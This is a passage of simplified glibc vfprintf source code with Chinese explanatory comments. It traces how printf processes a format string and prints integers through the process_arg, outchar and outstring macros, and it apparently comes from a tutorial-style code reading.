+&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Process&nbsp;whole&nbsp;format&nbsp;string.&nbsp;&nbsp;*/
+&nbsp;&nbsp;do
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;中间的操作非常的繁重
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;主要是处理了h，hh等等各种东西
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;不过格式化字符串本身在这里并不是我们关注的重点，所以我们跳过
+&nbsp;&nbsp;&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这里我们需要关注了，这里是在处理好格式化字符串本身的各种东西之后
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;真正对格式化字符串进行处理，进行输出等等
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Process&nbsp;current&nbsp;format.&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(1)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这里其实就是直接用了process_arg，看来还得继续跟一下
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;process_arg&nbsp;(((struct&nbsp;printf_spec&nbsp;*)&nbsp;NULL));
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;process_string_arg&nbsp;(((struct&nbsp;printf_spec&nbsp;*)&nbsp;NULL));
+&nbsp;&nbsp;&nbsp;&nbsp;LABEL&nbsp;(form_unknown):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(spec&nbsp;==&nbsp;L_(&#39;\0&#39;))
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;The&nbsp;format&nbsp;string&nbsp;ended&nbsp;before&nbsp;the&nbsp;specifier&nbsp;is&nbsp;complete.&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__set_errno&nbsp;(EINVAL);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;done&nbsp;=&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;all_done;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;If&nbsp;we&nbsp;are&nbsp;in&nbsp;the&nbsp;fast&nbsp;loop&nbsp;force&nbsp;entering&nbsp;the&nbsp;complicated
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;one.&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;do_positional;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;[...]
+}
+//&nbsp;process_arg是个大宏，也非常复杂，还是需要无数简化
+//&nbsp;下面整个是一个宏，所以忽略一些空格和反斜杠的不完整和错误，这样更为方便阅读
+#define&nbsp;process_arg(fspec)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;下面开始处理&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Start&nbsp;real&nbsp;work.&nbsp;&nbsp;We&nbsp;know&nbsp;about&nbsp;all&nbsp;flags&nbsp;and&nbsp;modifiers&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now&nbsp;process&nbsp;the&nbsp;wanted&nbsp;format&nbsp;specifier.&nbsp;&nbsp;*/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;LABEL&nbsp;(form_percent):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;我们只关注％d相关内容，其他类似
+&nbsp;&nbsp;&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;LABEL&nbsp;(form_integer):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;整数相关的从这里开始
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;设置base为10，意思是10进制
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;base&nbsp;=&nbsp;10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;根据具体情况，再进行一些处理，之后移交到具体的longlong_number和number进行处理
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(is_longlong)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL&nbsp;(longlong_number);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL&nbsp;(number);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;longlong_number和number类似，不重复了
+&nbsp;&nbsp;&nbsp;&nbsp;LABEL&nbsp;(number):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这里的中间过程最终设置好了string
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;也就是需要输出的字符串
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;根据是否是负数，使用outchar进行输出字符
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(is_negative)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outchar&nbsp;(L_(&#39;-&#39;));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(showsign)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outchar&nbsp;(L_(&#39;+&#39;));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(space)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outchar&nbsp;(L_(&#39;&nbsp;&#39;));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;使用outstring把已经设置好的string输出了
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outstring&nbsp;(string,&nbsp;workend&nbsp;-&nbsp;string);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+//&nbsp;宏的解释到这里结束
+//&nbsp;宏主要的内容其实也很显然，就是先根据具体的格式化字符串标识符来设置好string，string
+//&nbsp;也就是我们要输出的内容，是一个字符串，之后使用outstring来输出字符串，对于字符则使用
+//&nbsp;outchar输出字符
+//&nbsp;现在我们再来看看outchar和outstring
+#define&nbsp;outchar(Ch)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;do&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const&nbsp;INT_T&nbsp;outc&nbsp;=&nbsp;(Ch);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;又使用了PUTC来输出字符
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(PUTC&nbsp;(outc,&nbsp;s)&nbsp;==&nbsp;EOF&nbsp;||&nbsp;done&nbsp;==&nbsp;INT_MAX)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;done&nbsp;=&nbsp;-1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;all_done;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;++done;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;while&nbsp;(0)
+#define&nbsp;outstring(String,&nbsp;Len)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;do&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;assert&nbsp;((size_t)&nbsp;done&nbsp;&lt;=&nbsp;(size_t)&nbsp;INT_MAX);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;outstring则是使用了PUT来输出字符串
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((size_t)&nbsp;PUT&nbsp;(s,&nbsp;(String),&nbsp;(Len))&nbsp;!=&nbsp;(size_t)&nbsp;(Len))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;done&nbsp;=&nbsp;-1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;all_done;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(__glibc_unlikely&nbsp;(INT_MAX&nbsp;-&nbsp;done&nbsp;&lt;&nbsp;(Len)))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;done&nbsp;=&nbsp;-1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__set_errno&nbsp;(EOVERFLOW);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;all_done;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
